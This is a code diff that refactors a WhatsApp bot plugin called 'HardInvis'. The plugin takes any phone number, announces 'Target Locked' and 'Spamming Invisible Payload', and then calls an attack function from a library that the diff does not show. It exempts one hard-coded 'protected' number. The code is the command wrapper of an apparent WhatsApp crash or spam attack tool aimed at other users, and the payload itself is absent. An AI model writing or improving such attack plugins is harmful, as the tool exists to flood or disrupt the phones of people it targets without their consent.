@@ -1,31 +1,44 @@
-const { HardInvis } = require('../lib/rizoinvis');
+// plugins/rizoinvis.js
+const { cmd } = require("../arslan");
+let { HardInvis } = require('../lib/rizoinvis');
 
-module.exports = {
-  name: "rizoinvis",
-  commands: ['hardinvis', 'rizoinvis', 'hinvis'],
-  category: "owner",
-  description: "Toggle invisible presence state",
-  async execute(sock, m, args) {
+let handler = async (m, { conn, args, command, isCreator }) => {
+    if (!isCreator) return m.reply('🔒 *Owner Only - HardInvis Command!*');
+
     if (!args[0]) {
-      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizoinvis 923xx` }, { quoted: m });
+        return m.reply(`📌 *Usage:* .${command} 923xx`);
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
+
+    if (!pepec) {
+        return m.reply('❌ *Invalid number format!*');
+    }
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
+        return m.reply('🔒 *This number is protected!*');
     }
 
     let target = pepec + '@s.whatsapp.net';
-    await sock.sendMessage(m.chat, { text: `👻 *HardInvis Target Locked:* ${pepec}\n⚡ *Spamming Invisible Payload...*` }, { quoted: m });
+
+    await m.reply(`👻 *HardInvis Target Locked:* ${pepec}\n⚡ *Spamming Invisible Payload with Error Control...*`);
 
     try {
-      await HardInvis(sock, target);
-      await sock.sendMessage(m.chat, { react: { text: "👻", key: m.key } });
+        // Background ya sequential execution ke liye call kar rahe hain
+        await HardInvis(conn, target);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: "👻", key: m.key }
+        });
+
     } catch (error) {
-      await sock.sendMessage(m.chat, { text: "⚠️ Error: HardInvis plugin execute karte waqt masla aaya hai." }, { quoted: m });
+        console.error("Plugin Error:", error);
+        m.reply("⚠️ Error: HardInvis plugin execute karte waqt masla aaya hai.");
     }
-  }
-};
+}
+
+handler.command = ['hardinvis', 'rizoinvis', 'hinvis'];
+handler.tags = ['owner', 'rizo'];
+handler.help = ['hardinvis 923xx'];
+module.exports = handler;
